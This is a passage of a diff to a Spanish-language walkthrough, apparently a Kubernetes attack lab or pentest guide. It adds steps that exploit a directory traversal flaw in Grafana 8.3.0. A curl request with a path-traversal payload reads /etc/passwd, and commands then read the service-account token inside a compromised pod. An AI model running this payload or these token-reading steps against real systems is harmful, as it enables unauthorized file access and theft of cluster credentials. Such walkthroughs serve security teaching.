@@ -124,7 +124,30 @@ $ curl -L http://grafana:3000
 
 ```
 
-Y buscar versiones vulnerables en alguno de los servicios. Por ejemplo, Grafana 8.3.0 que es vulnerable a Directory Traversal y es posible leer cualquier archivo.
+Y buscar versiones vulnerables en alguno de los servicios. Por ejemplo, Grafana 8.3.0 que es vulnerable a Directory Traversal y es posible leer cualquier archivo (https://www.exploit-db.com/exploits/50581).
+
+```console
+$ curl --path-as-is http://grafana:3000/public/plugings/logs/../../../../../../../../../../../../../../etc/passwd 
+
+
+```
+
+El objetivo es obtener más `secrets`. Si buscamos en el pod comprometido vemos dónde pueden estar estos `secrets`, concretamente el token de acceso:
+
+```console
+$ cd /var/run/secrets/kubernetes.io/serviceaccount
+$ ls
+ca.crt   namespace   token
+$ cat token
+ey .....Xw
+```
+
+
+
+
+```
+
+
 
 
 
